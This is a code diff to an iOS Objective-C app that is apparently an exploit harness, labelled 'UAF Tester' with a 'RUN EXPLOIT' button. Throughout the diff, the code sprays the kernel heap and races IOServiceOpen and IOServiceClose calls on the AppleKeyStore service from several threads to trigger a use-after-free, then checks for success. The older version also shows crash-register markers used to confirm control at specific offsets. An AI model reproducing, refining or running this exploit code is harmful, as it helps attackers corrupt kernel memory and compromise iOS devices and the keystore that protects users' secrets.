@@ -266,169 +266,95 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     log_callback(@"[CLEANUP] Spray cleanup complete");
 }
 
-// ==================================================================
-
 @interface ViewController ()
 @property (strong, nonatomic) UITextView *textView;
 @property (strong, nonatomic) UIButton *testButton;
-@property (nonatomic, strong) NSMutableString *logBuffer;
+@property (strong, nonatomic) NSMutableString *logBuffer;
 @end
 
 @implementation ViewController
 
 - (void)viewDidLoad {
     [super viewDidLoad];
-    
-    // 1. Cài đặt màu nền cho màn hình chính
+    [self setupUI];
+    self.logBuffer = [NSMutableString string];
+    [self appendLog:@"[READY] UAF Tester v3_Fixed"];
+}
+
+- (void)setupUI {
     self.view.backgroundColor = [UIColor blackColor];
     
-    // 2. Tạo TextView để hiện Log
-    self.textView = [[UITextView alloc] initWithFrame:CGRectMake(10, 60, self.view.bounds.size.width - 20, self.view.bounds.size.height - 200)];
-    self.textView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0]; // Màu xám đen
-    self.textView.textColor = [UIColor greenColor]; // Chữ màu xanh lá cho giống hacker
-    self.textView.font = [UIFont fontWithName:@"Menlo" size:12.0];
+    // Log View
+    self.textView = [[UITextView alloc] initWithFrame:CGRectMake(10, 60, self.view.bounds.size.width - 20, self.view.bounds.size.height - 180)];
+    self.textView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
+    self.textView.textColor = [UIColor greenColor];
+    self.textView.font = [UIFont fontWithName:@"Menlo" size:11.0];
     self.textView.editable = NO;
-    self.textView.layer.cornerRadius = 10;
     [self.view addSubview:self.textView];
     
-    // 3. Tạo Button để chạy Test
+    // Button
     self.testButton = [UIButton buttonWithType:UIButtonTypeSystem];
     self.testButton.frame = CGRectMake(20, self.view.bounds.size.height - 100, self.view.bounds.size.width - 40, 50);
-    [self.testButton setTitle:@"START EXPLOIT v3_debug" forState:UIControlStateNormal];
+    [self.testButton setTitle:@"RUN EXPLOIT" forState:UIControlStateNormal];
     [self.testButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
     self.testButton.backgroundColor = [UIColor systemRedColor];
-    self.testButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
-    self.testButton.layer.cornerRadius = 12;
-    
-    // Kết nối nút bấm với hàm runTest:
-    [self.testButton addTarget:self action:@selector(runTest:) forControlEvents:UIControlEventTouchUpInside];
+    self.testButton.layer.cornerRadius = 10;
+    [self.testButton addTarget:self action:@selector(startTest) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.testButton];
-    
-    // 4. Khởi tạo buffer log
-    self.logBuffer = [NSMutableString string];
-    [self appendLog:@"[SYSTEM] UAF Tester Ready (v3_debug)"];
-    [self appendLog:@"[SYSTEM] UI initialized programmatically."];
 }
 
-- (IBAction)runTest:(id)sender {
+- (void)appendLog:(NSString *)msg {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        [self.logBuffer appendFormat:@"%@\n", msg];
+        self.textView.text = self.logBuffer;
+        [self.textView scrollRangeToVisible:NSMakeRange(self.textView.text.length - 1, 1)];
+    });
+}
+
+- (void)startTest {
     self.testButton.enabled = NO;
     [self.logBuffer setString:@""];
-    [self appendLog:@"========================================"];
-    [self appendLog:@"Starting UAF test (with heap spray)..."];
-    [self appendLog:@"========================================"];
+    [self appendLog:@"[!] Starting Exploit..."];
     
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        [self runUAFWithSpray];
-        dispatch_async(dispatch_get_main_queue(), ^{
-            self.testButton.enabled = YES;
-        });
+        [self runExploitLogic];
     });
 }
 
-- (void)runUAFWithSpray {
-    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
-                                                    IOServiceMatching(AKS_SERVICE));
-    if (!svc) {
-        [self appendLog:@"Failed to find AppleKeyStore service"];
+- (void)runExploitLogic {
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(AKS_SERVICE));
+    if (!svc) { [self appendLog:@"[-] AKS Service not found"]; return; }
+    
+    [self appendLog:[NSString stringWithFormat:@"[+] Spraying %d objects...", SPRAY_COUNT]];
+    int sprayed = run_heap_spray(svc);
+    [self appendLog:[NSString stringWithFormat:@"[+] Sprayed %d successfully", sprayed]];
+    
+    if (IOServiceOpen(svc, mach_task_self(), 0, &g_conn) != KERN_SUCCESS) {
+        [self appendLog:@"[-] Failed to open connection"];
         return;
     }
-    
-    // ===== PHASE 1: HEAP SPRAY =====
-    [self appendLog:@""];
-    [self appendLog:@">>> PHASE 1: HEAP SPRAY"];
-    
-    int spray_result = heap_spray_init(svc, ^(NSString *msg) {
-        [self appendLog:msg];
-    });
-    
-    if (spray_result != 0) {
-        [self appendLog:@"❌ Heap spray failed!"];
-        IOObjectRelease(svc);
-        return;
-    }
-    
-    [self appendLog:@"✓ Heap spray successful"];
-    [self appendLog:@""];
-    
-    // ===== PHASE 2: UAF TRIGGER =====
-    [self appendLog:@">>> PHASE 2: UAF TRIGGER"];
-    
-    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
-    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
-        [self appendLog:@"Failed to open connection"];
-        heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
-        IOObjectRelease(svc);
-        return;
-    }
-    
-    [self appendLog:@"Connection opened"];
     
     pthread_t threads[NUM_RACERS];
-    for (int i = 0; i < NUM_RACERS; i++) {
-        pthread_create(&threads[i], NULL, racer_thread, NULL);
-    }
+    for (int i = 0; i < NUM_RACERS; i++) pthread_create(&threads[i], NULL, racer_thread, NULL);
     
-    atomic_store_explicit(&g_phase, 1, memory_order_release);
-    [self appendLog:@"Racers started"];
+    atomic_store(&g_phase, 1);
+    [self appendLog:@"[+] Racing..."];
     
-    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
-        if (atomic_load(&g_errors) > 0) {
-            [self appendLog:[NSString stringWithFormat:@"UAF triggered at attempt %d", attempt]];
-            break;
-        }
-        
-        kr = IOServiceClose(g_conn);
-        usleep(1);
-        
-        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
-        if (kr != KERN_SUCCESS) {
-            [self appendLog:@"Reopen failed"];
-            break;
-        }
-        
-        if ((attempt + 1) % 100 == 0) {
-            uint32_t calls = atomic_load(&g_calls);
-            [self appendLog:[NSString stringWithFormat:@"Progress: %d attempts, %u calls", 
-                            attempt + 1, calls]];
-        }
-    }
-    
-    atomic_store_explicit(&g_phase, 3, memory_order_release);
-    
-    for (int i = 0; i < NUM_RACERS; i++) {
-        pthread_join(threads[i], NULL);
-    }
-    
-    uint32_t total_calls = atomic_load(&g_calls);
-    uint32_t total_errors = atomic_load(&g_errors);
-    
-    [self appendLog:@""];
-    [self appendLog:@"========================================"];
-    [self appendLog:@"Test Results:"];
-    [self appendLog:[NSString stringWithFormat:@"Total calls:  %u", total_calls]];
-    [self appendLog:[NSString stringWithFormat:@"Total errors: %u", total_errors]];
-    
-    if (total_errors > 0) {
-        [self appendLog:@"✓ UAF TRIGGERED!"];
-        [self appendLog:@""];
-        [self appendLog:@"Check crash log for x16 register:"];
-        [self appendLog:@"  Expected: One of our markers"];
-        [self appendLog:@"  0x4242... = offset 0x110 ✓"];
-        [self appendLog:@"  0x4343... = offset 0x118"];
-        [self appendLog:@"  0x4444... = offset 0x120"];
-        [self appendLog:@"  0x4545... = offset 0x128"];
-    } else {
-        [self appendLog:@"UAF not triggered"];
-    }
-    [self appendLog:@"========================================"];
-    
-    // Cleanup
-    if (g_conn != IO_OBJECT_NULL) {
+    for (int i = 0; i < MAX_ATTEMPTS; i++) {
+        if (atomic_load(&g_errors) > 0) break;
         IOServiceClose(g_conn);
+        usleep(1);
+        IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
+        if (i % 100 == 0) [self appendLog:[NSString stringWithFormat:@"Attempt %d...", i]];
     }
     
-    heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
-    IOObjectRelease(svc);
+    atomic_store(&g_phase, 3);
+    for (int i = 0; i < NUM_RACERS; i++) pthread_join(threads[i], NULL);
+    
+    [self appendLog:@"[DONE] Test finished."];
+    if (atomic_load(&g_errors) > 0) [self appendLog:@"[!!!] UAF SUCCESS! CHECK LOG."];
+    
+    dispatch_async(dispatch_get_main_queue(), ^{ self.testButton.enabled = YES; });
 }
 
 @end
